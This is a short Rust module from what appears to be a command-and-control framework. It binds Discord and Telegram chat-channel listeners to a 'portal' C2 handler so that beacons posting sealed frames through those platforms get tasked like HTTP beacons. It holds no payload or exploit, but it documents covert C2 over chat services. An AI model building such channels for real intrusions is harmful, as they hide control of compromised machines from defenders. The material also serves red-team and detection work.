//! Discord/Telegram C2 channels for the portal's own C2.
//!
//! The portal mounts its own C2 handler, so it needs its own chat-channel
//! listener: without one, a beacon whose payload points at `discord://` or
//! `telegram://` posts sealed frames into a chat and is never tasked.
//!
//! The carrier, loop, cursor and platform adapters all live in
//! `nw-profile::chat_channel` so this and the standalone C2 binary cannot
//! drift; this module only binds them to the portal's `Repository`.

use std::sync::Arc;

use nw_profile::chat_channel::FrameHandler;

use crate::db::repositories::Repository;

/// Run the portal's C2 pipeline for a chat-channel frame, so a beacon arriving
/// over Discord/Telegram is handled exactly like one arriving over HTTP.
pub fn frame_handler(repository: Repository, psk: Arc<Vec<u8>>) -> FrameHandler {
    Arc::new(move |sealed: &[u8]| {
        // The boxed future must be 'static, so it owns its copies rather than
        // borrowing the caller's.
        let repository = repository.clone();
        let psk = psk.clone();
        let sealed = sealed.to_vec();
        Box::pin(async move {
            crate::c2::process_sealed(&repository, &psk, &sealed, "chat")
                .await
                .map_err(|_| "chat channel frame rejected".to_string())
        })
    })
}
